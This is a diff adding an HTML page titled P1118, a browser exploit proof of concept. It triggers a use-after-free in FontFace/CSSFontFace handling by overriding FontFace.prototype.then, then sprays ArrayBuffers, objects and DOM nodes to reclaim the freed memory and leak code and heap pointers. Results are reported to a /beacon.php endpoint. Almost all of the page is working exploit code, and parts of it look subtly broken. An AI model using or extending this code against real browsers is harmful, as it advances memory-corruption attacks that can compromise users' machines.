@@ -1,0 +1,485 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1118</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+B('P1118-BOOT','');
+log('phase','=== P1118: UAF VTABLE HUNT + MULTI-OBJECT TYPE CONFUSION ===');
+log('info','Goal: Find CODE pointers via UAF reclaim of different object types');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var allFindings=[];
+var totalRounds=0;
+
+// ==================================================================
+// STRATEGY: The P1112 UAF gives us HEAP pointers at +88 and +104.
+// Those heap pointers ARE the freed CSSFontFace object fields.
+// A vtable pointer would be at offset +0 of the freed object.
+// But bmalloc zeroes ArrayBuffers, so we can't see residual data.
+//
+// NEW APPROACH: Instead of ArrayBuffer spray, try:
+// 1. Spray with objects that have their OWN vtable pointers
+// 2. Read back through the UAF'd ArrayBuffer
+// 3. The object's vtable IS a code pointer
+//
+// Objects to try for type confusion:
+// - Regular JS objects (JSObject vtable)
+// - Arrays (JSArray vtable)
+// - RegExp (JSRegExp vtable)
+// - TypedArrays (views, not backing stores)
+// - DOM nodes (Element vtable)
+// - String objects (JSString)
+// - Error objects (ErrorInstance vtable)
+// ==================================================================
+
+// Master UAF function - runs the EXACT P1112 technique
+// but allows custom spray callbacks
+function runUAF(label, sprayFn, scanFn, cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:u"+totalRounds+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('uf'+totalRounds,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+
+  var fired=false,sprayResult=null,found=false;
+  var origThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    sprayResult=sprayFn();
+    try{document.fonts.check('1em u'+totalRounds);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em uf'+totalRounds+', u'+totalRounds,'AB').then(function(){},function(){});
+
+  // Poll for data
+  for(var t=5;t<=300;t+=3){(function(ms){setTimeout(function(){
+    if(found||!sprayResult)return;
+    var result=scanFn(sprayResult);
+    if(result){
+      found=true;
+      allFindings.push(label+'|'+result);
+      B('P1118-'+label,result);
+      log('win',label+': '+result);
+    }
+  },ms);})(t);}
+
+  setTimeout(function(){
+    if(origThen)Object.defineProperty(FontFace.prototype,'then',origThen);
+    else delete FontFace.prototype.then;
+    if(!found)log('info',label+': nz=0');
+    totalRounds++;
+    cb();
+  },350);
+}
+
+// ---- PHASE A: Standard ArrayBuffer spray (reproduce P1112) ----
+function phaseA(cb){
+  log('phase','--- PHASE A: Standard ArrayBuffer spray (P1112 exact) ---');
+  var aRound=0;var aMax=5;var aFound=false;
+  function nextA(){
+    if(aRound>=aMax){
+      B('P1118-A-DONE','found='+aFound+'|rounds='+aMax);
+      cb();return;
+    }
+    runUAF('A'+aRound,
+      function(){
+        var map=[];
+        for(var si=0;si<SIZES.length;si++){
+          for(var k=0;k<K;k++)map.push({size:SIZES[si],ab:new ArrayBuffer(SIZES[si])});
+        }
+        return map;
+      },
+      function(map){
+        for(var bi=24;bi<48;bi++){
+          if(!map[bi])continue;
+          var b=new BigUint64Array(map[bi].ab);
+          var nz=0,ptrs=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n){
+              nz++;ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+            }
+          }
+          if(nz>0){aFound=true;return'buf='+bi+'|sz='+map[bi].size+'|nz='+nz+'|'+ptrs.join(',');}
+        }
+        return null;
+      },
+      function(){aRound++;nextA();}
+    );
+  }
+  nextA();
+}
+
+// ---- PHASE B: Object spray instead of ArrayBuffer ----
+// Create many small objects of ~192 bytes to reclaim the freed slot
+// Then read via the overlapping ArrayBuffer from a SECOND UAF
+function phaseB(cb){
+  log('phase','--- PHASE B: Object spray + ArrayBuffer overlay ---');
+  // Two-stage: first do object spray UAF to fill slot, then ArrayBuffer UAF to read it
+
+  var bRound=0;var bMax=5;var bFound=false;
+
+  function nextB(){
+    if(bRound>=bMax){
+      B('P1118-B-DONE','found='+bFound+'|rounds='+bMax);
+      cb();return;
+    }
+
+    // Stage 1: UAF with mixed spray (some ArrayBuffers for reading, plus JS objects)
+    runUAF('B'+bRound,
+      function(){
+        var result={abs:[],objs:[]};
+        // Mix ArrayBuffers and JS objects
+        for(var i=0;i<50;i++){
+          // ArrayBuffer at exact CSSFontFace size (192 bytes)
+          result.abs.push(new ArrayBuffer(192));
+          // Also create objects with properties to fill adjacent slots
+          var obj={};
+          for(var p=0;p<20;p++)obj['p'+p]=new Error('err'+i+'_'+p);
+          result.objs.push(obj);
+        }
+        // Also spray RegExp (has vtable)
+        for(var i=0;i<30;i++){
+          result.objs.push(new RegExp('test'+i+'_'+Math.random()));
+        }
+        // Also spray DOM elements (have vtable)
+        for(var i=0;i<20;i++){
+          var el=document.createElement('div');
+          el.setAttribute('data-x','x'.repeat(150));
+          result.objs.push(el);
+        }
+        // Spray TypedArray views (not backing stores)
+        for(var i=0;i<30;i++){
+          result.objs.push(new Float64Array(24)); // 192 bytes backing
+        }
+        return result;
+      },
+      function(result){
+        for(var ai=0;ai<result.abs.length;ai++){
+          var b=new BigUint64Array(result.abs[ai]);
+          var nz=0,ptrs=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n){
+              nz++;
+              var tag=ptrTag(b[q]);
+              ptrs.push('+'+q*8+'='+hex64(b[q])+'('+tag+')');
+              if(tag==='CODE')bFound=true;
+            }
+          }
+          if(nz>0)return'abIdx='+ai+'|nz='+nz+'|'+ptrs.join(',');
+        }
+        return null;
+      },
+      function(){bRound++;nextB();}
+    );
+  }
+  nextB();
+}
+
+// ---- PHASE C: Double UAF with different sizes ----
+// Do TWO FontFace UAFs back-to-back:
+// First: free + spray with large ArrayBuffers containing marker values
+// Second: free + spray with 192B ArrayBuffers and scan for markers
+function phaseC(cb){
+  log('phase','--- PHASE C: Staggered double UAF ---');
+  var cRound=0;var cMax=5;var cFound=false;
+
+  function nextC(){
+    if(cRound>=cMax){
+      B('P1118-C-DONE','found='+cFound+'|rounds='+cMax);
+      cb();return;
+    }
+
+    // First UAF - create the freed slot and spray ArrayBuffers
+    var st1=document.createElement('style');
+    st1.textContent="@font-face{font-family:c1_"+cRound+";src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st1);
+    var ff1=new FontFace('cf1_'+cRound,'local(Courier)',{unicodeRange:'U+0041'});
+    document.fonts.add(ff1);void ff1.loaded;
+
+    var fired1=false,map1=null;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+      if(fired1)return undefined;fired1=true;
+      st1.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      map1=[];
+      // Spray with 192B buffers and write markers
+      for(var i=0;i<60;i++){
+        var ab=new ArrayBuffer(192);
+        var v=new BigUint64Array(ab);
+        // Write a distinctive pattern
+        v[0]=BigInt('0xDEAD'+i.toString(16).padStart(4,'0')+'CAFE0000');
+        v[11]=BigInt('0x41414141'+'42424242'); // at +88
+        v[13]=BigInt('0x43434343'+'44444444'); // at +104
+        map1.push(ab);
+      }
+      return undefined;
+    },set:function(){}});
+
+    document.fonts.load('1em cf1_'+cRound+', c1_'+cRound,'AB').then(function(){},function(){});
+
+    // After first UAF settles, do second UAF
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      // Now the freed CSSFontFace slot MIGHT have our marker data
+      // Do second UAF to free another CSSFontFace and spray NEW ArrayBuffers to READ
+      var st2=document.createElement('style');
+      st2.textContent="@font-face{font-family:c2_"+cRound+";src:local(Arial);unicode-range:U+0043;}";
+      document.head.appendChild(st2);
+      var ff2=new FontFace('cf2_'+cRound,'local(Times)',{unicodeRange:'U+0044'});
+      document.fonts.add(ff2);void ff2.loaded;
+
+      var fired2=false,map2=null,found2=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(fired2)return undefined;fired2=true;
+        st2.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        map2=[];
+        for(var i=0;i<60;i++){
+          map2.push(new ArrayBuffer(192));
+        }
+        return undefined;
+      },set:function(){}});
+
+      document.fonts.load('1em cf2_'+cRound+', c2_'+cRound,'CD').then(function(){},function(){});
+
+      // Scan second batch for ANY non-zero data (could be from first UAF's markers or real pointers)
+      for(var t=5;t<=200;t+=3){(function(ms){setTimeout(function(){
+        if(found2||!map2)return;
+        for(var bi=0;bi<map2.length;bi++){
+          var b=new BigUint64Array(map2[bi].ab);
+          var nz=0,ptrs=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n){
+              nz++;
+              ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+            }
+          }
+          if(nz>0){
+            found2=true;cFound=true;
+            var res='bi='+bi+'|nz='+nz+'|'+ptrs.join(',');
+            allFindings.push('C'+cRound+'|'+res);
+            B('P1118-C-UAF',res);
+            log('win','C'+cRound+': '+res);
+          }
+        }
+      },ms);})(t);}
+
+      setTimeout(function(){
+        delete FontFace.prototype.then;
+        if(!found2)log('info','C'+cRound+': nz=0');
+        cRound++;nextC();
+      },250);
+    },500);
+  }
+  nextC();
+}
+
+// ---- PHASE D: FontFace.status and property reads on freed object ----
+// After UAF, try accessing the FontFace object's properties
+// which read from the freed CSSFontFace C++ backing
+function phaseD(cb){
+  log('phase','--- PHASE D: Post-free property oracle ---');
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:d0;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('df0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var fired=false,savedFF=null;
+
+  // Save reference to the FontFace so we can read it after free
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    savedFF=this; // keep reference!
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // Spray to reclaim
+    for(var i=0;i<80;i++)new ArrayBuffer(192);
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em df0, d0','AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    if(!savedFF){
+      B('P1118-D-DONE','no_ref');
+      log('fail','D: No FontFace reference captured');
+      cb();return;
+    }
+
+    // Now try reading properties of the freed/reclaimed FontFace
+    var results=[];
+    var props=['family','style','weight','stretch','unicodeRange','variant',
+               'featureSettings','display','status','loaded'];
+    for(var i=0;i<props.length;i++){
+      try{
+        var val=savedFF[props[i]];
+        var s=typeof val==='object'?JSON.stringify(val):String(val);
+        if(s.length>100)s=s.substring(0,100)+'...';
+        results.push(props[i]+'='+s);
+      }catch(e){
+        results.push(props[i]+'=ERR:'+e.message.substring(0,40));
+      }
+    }
+
+    // Try toString
+    try{results.push('str='+savedFF.toString().substring(0,60));}catch(e){results.push('str=ERR');}
+
+    // Try load() on freed object
+    try{
+      var p=savedFF.load();
+      results.push('load=promise');
+      p.then(function(r){
+        results.push('loadOK='+String(r).substring(0,40));
+      },function(e){
+        results.push('loadFail='+e.message.substring(0,40));
+      });
+    }catch(e){results.push('load=ERR:'+e.message.substring(0,40));}
+
+    B('P1118-D-PROPS',results.join('||'));
+    log('info','D: '+results.join(' | '));
+
+    setTimeout(function(){
+      B('P1118-D-DONE','props='+results.length);
+      cb();
+    },500);
+  },500);
+}
+
+// ---- PHASE E: Worker-based UAF with SharedArrayBuffer probe ----
+// Transfer UAF'd ArrayBuffer to worker, scan from both sides
+function phaseE(cb){
+  log('phase','--- PHASE E: Worker UAF transfer + concurrent scan ---');
+
+  var workerCode=`
+    self.onmessage=function(e){
+      if(e.data.cmd==='scan'){
+        var ab=e.data.ab;
+        var b=new BigUint64Array(ab);
+        var ptrs=[];
+        for(var q=0;q<b.length;q++){
+          if(b[q]!==0n){
+            var hi=Number(b[q]>>32n);
+            var tag=hi>=0x200&&hi<=0x7FFF?'CODE':hi>=0x10&&hi<=0xFF?'HEAP':hi>=0xFFFF8000?'KERN':'val';
+            ptrs.push('+'+q*8+'=0x'+b[q].toString(16).padStart(16,'0')+'('+tag+')');
+          }
+        }
+        self.postMessage({cmd:'result',ptrs:ptrs,nz:ptrs.length});
+      }
+    };
+  `;
+  var blob=new Blob([workerCode],{type:'application/javascript'});
+  var wurl=URL.createObjectURL(blob);
+  var w;
+  try{w=new Worker(wurl);}catch(e){
+    B('P1118-E-DONE','worker_fail');log('fail','E: Worker creation failed');cb();return;
+  }
+
+  var eResults=[];
+
+  // Do 3 UAF rounds, transfer buffer to worker for scanning
+  var eRound=0;var eMax=3;
+  function nextE(){
+    if(eRound>=eMax){
+      w.terminate();URL.revokeObjectURL(wurl);
+      B('P1118-E-DONE','rounds='+eMax+'|results='+eResults.join(';'));
+      cb();return;
+    }
+
+    runUAF('E'+eRound,
+      function(){
+        var map=[];
+        for(var si=0;si<SIZES.length;si++){
+          for(var k=0;k<K;k++)map.push({size:SIZES[si],ab:new ArrayBuffer(SIZES[si])});
+        }
+        return map;
+      },
+      function(map){
+        // Check locally first
+        for(var bi=24;bi<48;bi++){
+          if(!map[bi])continue;
+          var b=new BigUint64Array(map[bi].ab);
+          var nz=0;
+          for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+          if(nz>0){
+            // Found data! Transfer to worker for detailed scan
+            try{
+              var copy=map[bi].ab.slice(0); // copy before transfer
+              w.postMessage({cmd:'scan',ab:map[bi].ab},[map[bi].ab]);
+            }catch(e){}
+            // Also scan copy locally
+            var bc=new BigUint64Array(copy);
+            var ptrs=[];
+            for(var q=0;q<bc.length;q++){
+              if(bc[q]!==0n)ptrs.push('+'+q*8+'='+hex64(bc[q])+'('+ptrTag(bc[q])+')');
+            }
+            eResults.push('bi='+bi+'|nz='+nz+'|'+ptrs.join(','));
+            return'bi='+bi+'|nz='+nz;
+          }
+        }
+        return null;
+      },
+      function(){eRound++;nextE();}
+    );
+  }
+
+  w.onmessage=function(e){
+    if(e.data.cmd==='result'){
+      B('P1118-E-WORKER','nz='+e.data.nz+'|'+e.data.ptrs.join(','));
+      log('info','E worker: nz='+e.data.nz+' '+e.data.ptrs.slice(0,3).join(', '));
+    }
+  };
+
+  nextE();
+}
+
+// ---- RUN ALL PHASES ----
+phaseA(function(){
+  phaseB(function(){
+    phaseC(function(){
+      phaseD(function(){
+        phaseE(function(){
+          var summary='total='+totalRounds+'|findings='+allFindings.length;
+          if(allFindings.length>0)summary+='|'+allFindings.slice(0,10).join(';;');
+          B('P1118-FINAL',summary);
+          log('phase','=== P1118 COMPLETE: '+allFindings.length+' findings in '+totalRounds+' rounds ===');
+        });
+      });
+    });
+  });
+});
+</script>
+</body></html>
